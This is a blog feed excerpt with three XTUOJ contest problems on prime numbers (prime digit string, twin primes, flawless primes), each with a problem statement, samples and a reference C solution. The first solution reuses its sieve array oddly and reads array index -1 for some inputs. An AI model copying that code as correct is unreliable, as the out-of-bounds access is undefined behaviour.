        {
            "id": "https://mangpumo.github.io/2022/11/01/XTUOJ-1345%E7%B4%A0%E6%95%B0%E5%AD%97%E7%AC%A6%E4%B8%B2/",
            "url": "https://mangpumo.github.io/2022/11/01/XTUOJ-1345%E7%B4%A0%E6%95%B0%E5%AD%97%E7%AC%A6%E4%B8%B2/",
            "title": "XTUOJ_1345素数字符串",
            "date_published": "2022-11-01T03:56:56.000Z",
            "content_html": "<h1 id=\"素数字符串\"><a class=\"anchor\" href=\"#素数字符串\">#</a> 素数字符串</h1>\n<h2 id=\"题目描述\"><a class=\"anchor\" href=\"#题目描述\">#</a> 题目描述</h2>\n<p>我们将素数从小到大依次书写，可以得到一个字符串 &quot;23571113⋯&quot;，已知一个数码 d (0≤d≤9), 求字符串在区间 [L,R] 之间的多少个 d?</p>\n<h2 id=\"输入\"><a class=\"anchor\" href=\"#输入\">#</a> 输入</h2>\n<p>第一行是一个整数 T (1≤T≤10000)，表示样例的个数。 每个样例是一行， 为 3 个整数，区间 L,R,(1≤L≤R≤1000000) 和数码 d。 区间从 1 开始计数。</p>\n<h2 id=\"输出\"><a class=\"anchor\" href=\"#输出\">#</a> 输出</h2>\n<p>每行输出一个样例的结果。</p>\n<h2 id=\"样例输入\"><a class=\"anchor\" href=\"#样例输入\">#</a> 样例输入</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2</span><br><span class=\"line\">1 8 1</span><br><span class=\"line\">1 8 4</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"样例输出\"><a class=\"anchor\" href=\"#样例输出\">#</a> 样例输出</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">3</span><br><span class=\"line\">0</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"参考源码\"><a class=\"anchor\" href=\"#参考源码\">#</a> 参考源码</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#define N 1000000</span><br><span class=\"line\">int b[N*3]=&#123;0,0&#125;;//素数标记</span><br><span class=\"line\">char s[N]=&#123;0&#125;;//素数字符串</span><br><span class=\"line\">int c[10][N+2]=&#123;0&#125;;//一维表示数码，二维表示个数</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int leng(int x)//计算位数 </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint len = 0;</span><br><span class=\"line\">\twhile(x)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tlen++;</span><br><span class=\"line\">\t\tx /= 10;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn len;</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int i,j,len = 0,t,flag=0;</span><br><span class=\"line\">    for(i=2; i&lt;=N*3; i++)//素数打表 </span><br><span class=\"line\">        b[i]=1;//0,1已被初始化为0 </span><br><span class=\"line\">    for(i=1; i&lt;=2000; i++) //i不能太大 </span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">        if(b[i]) </span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">            for(j=i*i; j&lt;=N*3; j=j+i)</span><br><span class=\"line\">                b[j]=0;//非素数</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    for(i=2;i&lt;=N*3;i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    \tif(b[i])//如果是素数 </span><br><span class=\"line\">    \t&#123;</span><br><span class=\"line\">    \t\tlen = leng(i);//计算位数 </span><br><span class=\"line\">    \t\tfor(int k=0;k&lt;len;k++)//根据位数长度存储 ，拆开 </span><br><span class=\"line\">    \t\t&#123;</span><br><span class=\"line\">    \t\t\tt = i;//存素数 </span><br><span class=\"line\">    \t\t\twhile(t)</span><br><span class=\"line\">    \t\t\t&#123;</span><br><span class=\"line\">    \t\t\t\tb[flag+len-1] = t%10+&#x27;0&#x27;;//SPRINTF </span><br><span class=\"line\">    \t\t\t\tt /= 10;</span><br><span class=\"line\">    \t\t\t\tflag++;//从0开始存储。flag不要重置 </span><br><span class=\"line\">    \t\t\t\tlen -= 2;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfor(i=0;i&lt;=N;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tint num = b[i]-&#x27;0&#x27;;//题目要求 </span><br><span class=\"line\">\t\tfor(int k=0;k&lt;10;k++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tif(k==num)//类前缀和 </span><br><span class=\"line\">\t\t\t    c[k][i] = c[k][i-1]+1;</span><br><span class=\"line\">\t\t\telse</span><br><span class=\"line\">\t\t\t    c[k][i] = c[k][i-1];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    int K;</span><br><span class=\"line\">    int L,R,d;</span><br><span class=\"line\">    scanf(&quot;%d&quot;,&amp;K);</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        while(K--)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            scanf(&quot;%d %d %d&quot;,&amp;L,&amp;R,&amp;d);</span><br><span class=\"line\">            printf(&quot;%d\\n&quot;,c[d][R-1]-c[d][L-1-1]);//规律 </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2022/11/01/XTUOJ-1237PrimeTwins/",
            "url": "https://mangpumo.github.io/2022/11/01/XTUOJ-1237PrimeTwins/",
            "title": "XTUOJ_1237PrimeTwins",
            "date_published": "2022-11-01T03:55:56.000Z",
            "content_html": "<h1 id=\"prime-twins\"><a class=\"anchor\" href=\"#prime-twins\">#</a> Prime Twins</h1>\n<h2 id=\"题目描述\"><a class=\"anchor\" href=\"#题目描述\">#</a> 题目描述</h2>\n<p>如果 n 和 n+2 都是素数，我们称其为孪生素数，比如 3 和 5，5 和 7 都是孪生素数。 给你一个区间 [a,b], 请问期间有多少对孪生素数？</p>\n<h2 id=\"输入\"><a class=\"anchor\" href=\"#输入\">#</a> 输入</h2>\n<p>第一行是一个整数 K (K≤ 10000)，表示样例的个数。 以后每行一个样例，为两个整数，a 和 b，1≤a≤b≤5000000。</p>\n<h2 id=\"输出\"><a class=\"anchor\" href=\"#输出\">#</a> 输出</h2>\n<p>每行输出一个样例的结果。</p>\n<h2 id=\"样例输入\"><a class=\"anchor\" href=\"#样例输入\">#</a> 样例输入</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">5 </span><br><span class=\"line\">1 3 </span><br><span class=\"line\">1 10 </span><br><span class=\"line\">1 100 </span><br><span class=\"line\">1 1000 </span><br><span class=\"line\">1 5000000</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"样例输出\"><a class=\"anchor\" href=\"#样例输出\">#</a> 样例输出</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0 </span><br><span class=\"line\">2 </span><br><span class=\"line\">8 </span><br><span class=\"line\">35 </span><br><span class=\"line\">32463</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"参考源码\"><a class=\"anchor\" href=\"#参考源码\">#</a> 参考源码</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;stdio.h&gt;</span><br><span class=\"line\">#define N 5000000</span><br><span class=\"line\">int b[N+1]=&#123;0,0&#125;,c[N+1]=&#123;0,0&#125;,d[N+1]=&#123;0,0&#125;;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int i,j;//素数筛法打表,1为素数</span><br><span class=\"line\">    for(i=2;i&lt;=N;i++)</span><br><span class=\"line\">        b[i]=1;</span><br><span class=\"line\">    //b[0] = 0;</span><br><span class=\"line\">    //b[1] = 0;</span><br><span class=\"line\">    for(i=2;i&lt;=N;i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        if(i==2)//不能少</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            b[i] = 1;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        if(b[i]==1)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            for(j=i*2;j&lt;=N;j=j+i)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                b[j] = 0;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    /*</span><br><span class=\"line\">    for(i=0;i&lt;100;i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        printf(&quot;%d &quot;,b[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    */</span><br><span class=\"line\">    for(i=2;i&lt;=N;i++)//标记孪生素数</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        if(b[i]==1&amp;&amp;b[i-2]==1)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            c[i]=1;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    /*</span><br><span class=\"line\">    for(i=0;i&lt;100;i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            printf(&quot;%d &quot;,c[i]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    */</span><br><span class=\"line\">    for(i=1;i&lt;=N;i++)//前缀和求数量</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        d[i]=d[i-1]+c[i];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    /*</span><br><span class=\"line\">    for(i=0;i&lt;100;i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            printf(&quot;%d &quot;,d[i]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    */</span><br><span class=\"line\">    int K;</span><br><span class=\"line\">    scanf(&quot;%d&quot;,&amp;K);</span><br><span class=\"line\">    while(K--)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        int a,b;</span><br><span class=\"line\">        scanf(&quot;%d %d&quot;,&amp;a,&amp;b);</span><br><span class=\"line\">        int c = d[b]-d[a+1];</span><br><span class=\"line\">        printf(&quot;%d\\n&quot;,c);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">     return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2022/10/30/XTUOJ-1295FlawlessPrime/",
            "url": "https://mangpumo.github.io/2022/10/30/XTUOJ-1295FlawlessPrime/",
            "title": "XTUOJ_1295FlawlessPrime",
            "date_published": "2022-10-30T04:46:45.000Z",
            "content_html": "<h1 id=\"flawless-prime\"><a class=\"anchor\" href=\"#flawless-prime\">#</a> Flawless Prime</h1>\n<h2 id=\"题目描述\"><a class=\"anchor\" href=\"#题目描述\">#</a> 题目描述</h2>\n<p>如果一个素数，依次去掉最高位得到一个数，这个数无前导 0，并仍是素数的话，我们称其为 “无瑕素数”。<br>\n比如 317 是素数，去掉最高位 3 得到 17 仍然是素数，再去掉最高位 1 得到 7，仍然是素数，所以 317 是 “无瑕素数”。<br>\n比如虽然 107 是素数，去掉最高位 1 得到 7 也是素数，但是因为存在前导 0，所以这不是无瑕素数。<br>\n请写一个程序，判断某个素数是不是无瑕的。</p>\n<h2 id=\"输入\"><a class=\"anchor\" href=\"#输入\">#</a> 输入</h2>\n<p>第一行是一个整数 K，表示样例的个数。 以后每行一个整数 n (2≤n≤1,000,000,000)。</p>\n<h2 id=\"输出\"><a class=\"anchor\" href=\"#输出\">#</a> 输出</h2>\n<p>如果是无瑕素数，输出 “Yes”，否则输出 “No”。</p>\n<h2 id=\"样例输入\"><a class=\"anchor\" href=\"#样例输入\">#</a> 样例输入</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">3</span><br><span class=\"line\">3</span><br><span class=\"line\">107</span><br><span class=\"line\">317</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"样例输出\"><a class=\"anchor\" href=\"#样例输出\">#</a> 样例输出</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Yes</span><br><span class=\"line\">No</span><br><span class=\"line\">Yes</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"参考源码\"><a class=\"anchor\" href=\"#参考源码\">#</a> 参考源码</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;math.h&gt;</span><br><span class=\"line\">int isprime(int n)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint i,jg=1;</span><br><span class=\"line\">\tif(n==1)</span><br><span class=\"line\">\tjg=0;</span><br><span class=\"line\">\tfor(i=2;i*i&lt;=n;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tif(n%i==0)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tjg=0;</span><br><span class=\"line\">\t\t\tbreak;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tif(jg==1)</span><br><span class=\"line\">\treturn 1;</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint K;</span><br><span class=\"line\">\tscanf(&quot;%d&quot;,&amp;K);</span><br><span class=\"line\">\twhile(K--)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tint n,i;</span><br><span class=\"line\">\t\tscanf(&quot;%d&quot;,&amp;n);</span><br><span class=\"line\">        int N = n;//记录原始数字,不能省略 </span><br><span class=\"line\">\t\tint qzx = 1;</span><br><span class=\"line\">\t\tint flag = 1;</span><br><span class=\"line\">\t\t//计算该数有多少位。并且判断是否有前导0（包括最后一位是不是0）</span><br><span class=\"line\">\t\twhile(N&gt;0) </span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tif(N%10==0) </span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tflag = 0;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\tqzx*=10;//位数 </span><br><span class=\"line\">\t\t\tN/=10;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tif(flag == 1) </span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t//从该数本身，到依次去除最高位得到的数</span><br><span class=\"line\">\t\t\tfor( i = qzx; i&gt;=10; i/=10) </span><br><span class=\"line\">\t\t\t&#123; </span><br><span class=\"line\">\t\t\t\tif(isprime(n%i)==0) </span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\tflag = 0;</span><br><span class=\"line\">\t\t\t\t\tbreak;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tif(flag == 1)</span><br><span class=\"line\">\t\t    printf(&quot;Yes\\n&quot;);</span><br><span class=\"line\">\t\telse</span><br><span class=\"line\">\t\t    printf(&quot;No\\n&quot;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n",
            "tags": []
        }
    ]
}